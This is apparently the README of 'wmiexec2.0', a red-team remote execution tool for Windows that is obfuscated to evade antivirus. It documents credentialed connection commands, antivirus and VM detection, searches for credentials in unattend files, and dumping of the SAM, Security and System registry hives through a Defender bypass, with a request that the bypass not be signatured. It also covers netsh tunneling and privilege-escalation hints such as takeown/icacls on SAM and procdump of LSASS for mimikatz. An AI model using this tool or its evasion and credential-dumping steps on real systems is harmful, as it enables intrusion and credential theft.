# wmiexec2.0
## Overview
- `wmiexec2.0` is the same `wmiexec` that everyone knows and loves.  
- This 2.0 version is obfuscated to avoid well known signatures from various AV engines.  
- It also has a handful of additional built in modules to help automate some common tasks on Red team engagements.  
- This script is under active development and will improve with time.  
- If you find an issue or want a specific module throw me a PR. 
- Enjoy 
## Installation
- **Do not** `wget` this file with `GitHubs Raw` feature, it will break the Ghost emoji. Git clone the repo and it will all work.
````
git clone https://github.com/ice-wzl/wmiexec2.git
cd wmiexec2/
pip3 install -r requirements.txt
````
## Modules
- Tested on:
````
#Windows Server 2022 Updated Febuary Defender Sigs
All modules working, no module flags
#Windows 10 Pro Defender Virus + Spyware Definition Version: 1.381.3595.0 2/14/2023
All modules working, no module flags
#Windows 10 Pro Kaspersky Standard App Version 21.8.5.452, Definitions 2/15/23
All modules working, no module flags
#Windows 8 Defender Virus and Spyware Definition Version: 1.383.35.0 2/15/2023
All modules working, no module flags
#Windows 7 Pro Defender Antispyware Definitions: v1.95.191.0 11/18/2010
Reg module not working, no module flags
````
## Help 
- To view the help and available modules:
````
C:\>help
````
## Connection
- You can still connect to the remote machine the exact same way.
- You can specify whether you want a `powershell` shell or a `cmd` shell by adding the flag `--shell-type powershell` or `--shell-type cmd` 
- Password auth + NT Hash auth still both apply 
````
python3 wmiexec2.0.py DOMAIN/USERNAME:PASSWORD@10.0.0.2 -shell-type powershell
python3 wmiexec2.0.py WORKGROUP/Administrator:'Password123!@#'@10.0.0.4 -shell-type powershell
````
## Normal wmiexec functionality 
- `lcd {path}` change directory on your local machine
- `exit` you should know this one
- `lput {src_file} {dst_file}` upload local file to remote machine path 
- `lget {file}` download remote file to your local machine
- `! {cmd}` execute local system command --> `!ls` lists your current directory on your local machine 
## Additional modules
- Everything else from here and below is additional features added into `wmiexec` to make it `wmiexec2.0`
- `cat` - just to make this more unix friendly simply uses `type` on the remote machine to view a file....just an alias you can use
- `ls` || `ls C:\Users` - allows you to view your current target directory. Its executing the `dir /a` command so you will see hidden files by default without any other special options
## Sysinfo
- To see basic target information use this module
````
👻 PS C:\>  sysinfo
[*] Target
dockerw-vg85334\administrator

[*] Hostname
DOCKERW-VG85334

[*] Arch: 
PROCESSOR_ARCHITECTURE=AMD64

[*] IP Addresses: 
   Link-local IPv6 Address . . . . . : fe80::f45c:9e14:7b55:d0b2%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 20.20.20.21(Preferred)
````
## Anti-Virus
- View some well known security products running on the target system.
- Enumerates the process list to see if they are running.
````
👻 PS C:\>  av
MsMpEng.exe
````
## Defender
- Check specific Defender settings
````
👻 PS C:\>  defender
[*] Defender Install Location
    InstallLocation    REG_SZ    C:\Program Files\Windows Defender\

[*] Defender Service is Running
[*] Defender Process Exclusions
	No Process Exclusions
[*] Defender Path Exclusions
[*] Tamper Protection is Disabled
````
## VMcheck
- Attempts to detect if you are in a virtual machine (So far works for ESXi/VMWare Workstation and QEMU) 
- Performs three checks 
- Looks for `C:\Program Files\VMWare`
- Looks for common running executables in a proccess list
- Pulls the `System Manufactuer` from host
````
👻 PS C:\>  vmcheck
[*] Common Processes: 
[*] No VM Processes found
C:\Program Files\VMware Not Present
OS Manufacturer:           Microsoft Corporation
System Manufacturer:       QEMU

[*] Virtual Box Detection
[!] Found VBox Files:
File Not Found
File Not Found
````
## unattend
- There are 11 files (that I know of) part of the `unattend` group in Windows that have the potential to have base64 encoded credentials in them. Find them all in one command
````
👻 PS C:\>  unattend
[*] Looking for: C:\unattend.txt, C:\unattend.inf

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features
    TamperProtection    REG_DWORD    0x1

End of search: 1 match(es) found.

[*] Looking for: C:\Windows\sysprep.inf
Nothing Found
[*] Looking for: C:\Windows\sysprep\sysprep.xml, C:\Windows\sysprep\sysprep.inf
Nothing Found
[*] Looking for: C:\Windows\Panther\Unattended.xml, C:\Windows\Panther\Unattend.xml
06/12/2024  04:33 PM            24,206 unattend.xml

[*] Looking for: C:\Windows\Panther\Unattend\Unattend.xml, C:\Windows\Panther\Unattend\Unattended.xml
Nothing Found
[*] Looking for: C:\Windows\System32\Sysprep\unattend.xml, C:\Windows\System32\Sysprep\unattended.xml
Nothing Found
````
## Regrip
- Save off the `SAM`, `Security` and `System` hives to your local machines.  Defender blocks this by default, so I had to find a bypass working as of 6/7/24.  Try to not get this signatured, thanks in advance.

## Tunneling
- Leverage Windows built in `netsh` tunneling without having to type the whole thing out 
- See picture for usage options
- ![tuns1](https://user-images.githubusercontent.com/75596877/218882531-aefcacce-de38-418d-9c8e-e9f21a6e6a7a.png)
## Loggrab
- Download log file of your choice
- Will download any file in `C:\windows\system32\winevt\logs`
- Use: `loggrab Security.evtx`
- ![image](https://user-images.githubusercontent.com/75596877/218882689-6ea2c4f3-d037-45f7-9a99-b267ab310281.png)
# Tokens 
- This module will enumerate your currently Enabled tokens and attempt to match them with a priv esc
````
👻 PS C:\>  tokens
[*] SeImpersonate Enabled:
	Juicy-Potato
	RougeWinRM
	SweetPotato
	PrintSpoofer
[*] SeBackupPrivilege Enabled:
	https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1
	https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug
	https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec
[*] SeTakeOwnershipPrivilege Enabled:
	takeown /f "C:\windows\system32\config\SAM"
	icacls "C:\windows\system32\config\SAM" /grant <your_username>:F
[*] SeDebugPrivilege Enabled:
	Procdump.exe on LSASS.exe, use mimikatz
````

## Survey
- under active development
- Input your own custom commands into `survey.conf` file seperated by a new line, or use the basic one that I have provided
- There are two options with this module:
- run module with `survey` which will print out the command you ran plus the output of that command
- Or run with `survey save`this will return none of the commands to stdout, but will save all commands run and their output into `survey.txt` located in your local pwd.
### survey save 
- ![image](https://user-images.githubusercontent.com/75596877/218883217-16dbf400-fb87-44bf-86a7-93e5f677070c.png)
- ![image](https://user-images.githubusercontent.com/75596877/218883247-7fed82d4-8b5d-402b-9db0-85abf74a5e07.png)
### survey
- ![image](https://user-images.githubusercontent.com/75596877/218883378-4b26c8df-4e6e-45e8-a29f-b34bcaeea448.png)

## Known impacket issues 
- If you recieve this error:
````
python3 wmiexec2.py Administrator:'abc123!!!'@172.17.0.2 -shell-type powershell  
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[-] Can't find a valid stringBinding to connect
````
- This is usually caused when a target system is NAT'ed in some way. A target behind a router, a cloud VPS, or a docker container are three good examples that will cause this error.
- To read more
- https://github.com/fortra/impacket/issues/272
### To Fix
- Find your `dcomrt.py` file (if you `pip3 install -r requirements.txt`) it should be under `~`
````
find / -type f -name "dcomrt.py" 2>/dev/null
/opt/impacket-0.11.0/build/lib/impacket/dcerpc/v5/dcomrt.py
/opt/impacket-0.11.0/impacket/dcerpc/v5/dcomrt.py
/opt/Responder/tools/MultiRelay/impacket-dev/impacket/dcerpc/v5/dcomrt.py
/home/ubuntu/.local/lib/python3.10/site-packages/impacket/dcerpc/v5/dcomrt.py
````
- Edit the file
````
vim /home/ubuntu/.local/lib/python3.10/site-packages/impacket/dcerpc/v5/dcomrt.py
````
- Find this line
````
if stringBinding is None:
````
- Comment out this line right before the above line
````
#raise Exception('Can\'t find a valid stringBinding to connect')
````
- Add these two lines instead
````
stringBinding = 'ncacn_ip_tcp:%s%s' % (self.get_target(), bindingPort)
LOG.info('Can\'t find a valid stringBinding to connect,use default!')
````
- That should fix the issue!
